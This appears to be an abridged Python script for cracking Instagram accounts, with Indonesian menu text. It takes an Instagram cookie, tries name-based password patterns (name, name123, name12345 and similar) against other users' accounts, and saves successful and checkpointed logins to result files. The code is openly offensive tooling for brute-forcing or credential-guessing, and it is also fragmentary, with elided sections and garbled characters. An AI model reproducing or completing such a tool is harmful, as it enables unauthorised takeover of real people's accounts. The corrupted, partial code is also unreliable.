...
{B}[{P}>{B}]{P} {K}AU {P}: {K}MELANIN  {P}Ft. {H}H4CK-M4N {M}Samuel
...
def ___login___():
    os.system('clear')
    print(___logo___)
    print(f"{B}[{P}鈥B}]{P} {H}Masukan Cookie Instagram, Jika Anda Gabut Ketik {M}[{P}{K}Open{M}]{P}\n")
...
class ___crack___:
    ...
    def __init__(self):
        ...
        self.ok = []
        self.cp = []
        print(f"\n{B}[{P}1{B}]{P} {H}Use Password {M}[{H}nama, nama123, nama12345{M}]{H}")
        print(f"{B}[{P}2{B}]{H} Use Password {M}[{H}nama, nama123, nama1234, nama12345{M}]{H}")
        print(f"{B}[{P}3{B}]{H} Use Password {M}[{H}nama, nama123, nama1234, nama12345, nama123456{M}]{H}")
        ...
        try:
            print(f"\n{B}[{P}鈥B}]{H} Hasil Ok Tersimpan Di Results/Ok.txt")
            print(f"{B}[{P}鈥B}]{H} Hasil Cp Tersimpan Di Results/Cp.txt\n")
            ...
            for pw in pwx:
                ...
                with requests.Session() as ses:
                    ...
                    if 'userId' in str(response):
                        ...
                        print(f"\r{B}[{P}鉁攞B}]{P} Status :{H} Siesta-Live     ")
                        ...
                        print(f"\r{B}[{P}鉁榹B}]{P} Status :{K} Ruphas-Fuck    ")
